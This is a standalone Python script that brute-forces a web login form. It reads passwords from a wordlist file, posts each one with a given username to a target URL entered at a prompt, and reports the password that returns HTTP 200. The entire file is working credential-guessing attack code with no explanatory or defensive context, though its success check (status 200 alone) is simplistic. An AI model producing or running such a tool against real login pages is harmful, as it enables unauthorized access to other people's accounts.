import requests

def brute_force(target_url, username, password_list_file):
    try:
        with open(password_list_file, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"Password file '{password_list_file}' not found.")
        return

    for password in passwords:
        try:
            response = requests.post(target_url, data={"username": username, "password": password}, timeout=5)
            if response.status_code == 200:
                print(f"Success! Password found: {password}")
                return
            else:
                print(f"Failed login attempt with password: {password} (Status: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")

if __name__ == "__main__":
    url = input("Enter target URL: ")
    user = input("Enter username: ")
    password_file = input("Enter path to password list: ")
    brute_force(url, user, password_file)
